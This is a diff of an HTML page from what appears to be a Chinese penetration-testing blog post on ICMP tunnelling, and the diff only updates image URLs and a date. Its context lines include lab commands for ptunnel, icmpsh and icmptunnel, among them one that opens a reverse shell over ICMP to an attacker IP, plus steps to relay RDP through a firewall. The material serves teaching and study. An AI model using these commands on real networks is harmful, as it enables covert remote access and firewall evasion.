@@ -271,7 +271,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-04-07_15-43-51.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-04-07_15-43-51.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -432,7 +432,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-08-04
+                    2021-11-22
                 </div>
                 
 
@@ -522,7 +522,7 @@ Win RDP 目标机    192.168.7.110 (内网)<span aria-hidden="true" class="line-
 <pre class="line-numbers language-none"><code class="language-none">ptunnel -x teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>之后访问 Kali 攻击机 172.16.214.6 的 1080 端口就会连接到 Win RDP 目标机 192.168.7.110 的 3389 端口了，不过实测发现这种方法有些不稳定。</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-04-07_14-46-46.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-04-07_14-46-46.png"></p>
 <h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><p>icmpsh 使用很简单，直接在 github 上下载，运行时不需要管理员权限，但是在使用时需要关闭本地系统的 ICMP 应答，不然 shell 的运行会不稳定。</p>
 <pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;inquisb&#x2F;icmpsh.git #下载工具
 apt-get install python-impacket # 安装依赖，或者 pip2 install impacket
@@ -545,7 +545,7 @@ sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1  #关闭本地ICMP应答<span ari
 <pre class="line-numbers language-none"><code class="language-none">.&#x2F;icmpsh.exe -t 172.16.214.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>此时在攻击机上可以看到通过 icmp 协议建立的 shell</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-04-07_15-43-51.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-04-07_15-43-51.png"></p>
 <h3 id="icmptunnel"><a href="#icmptunnel" class="headerlink" title="icmptunnel"></a>icmptunnel</h3><p> icmptunnel 的优势在于可以穿过状态防火墙或 NAT，同样在 github 上进行下载，值得注意的是该工具只有 Linux 版。</p>
 <pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;jamesbarlow&#x2F;icmptunnel.git
 cd icmptunnel
@@ -573,7 +573,7 @@ make<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span
 <p>在攻击机上，尝试通过 ssh 进行连接，可以看到通过刚才建立的隧道成功连接到目标机。</p>
 <pre class="line-numbers language-none"><code class="language-none">ssh root@10.0.0.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-04-07_16-35-09.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-04-07_16-35-09.png"></p>
 <blockquote>
 <p>参考链接：</p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7875">https://xz.aliyun.com/t/7875</a></p>
@@ -581,7 +581,7 @@ make<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span
 <p><a target="_blank" rel="noopener" href="https://xiaix.me/li-yong-icmp-sui-dao-chuan-tou-fang-huo-qiang/">https://xiaix.me/li-yong-icmp-sui-dao-chuan-tou-fang-huo-qiang/</a></p>
 <p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
 </blockquote>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/TeamsSix_Subscription_Logo2.png"></p>
 
                 
             </div>
@@ -733,7 +733,7 @@ make<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span
                 <a href="/210528-130449.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-05-28_12-36-45.png" class="responsive-img" alt="【内网学习笔记】7、lcx、netcat和socat的使用">
+                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-05-28_12-36-45.png" class="responsive-img" alt="【内网学习笔记】7、lcx、netcat和socat的使用">
                         
                         <span class="card-title">【内网学习笔记】7、lcx、netcat和socat的使用</span>
                     </div>
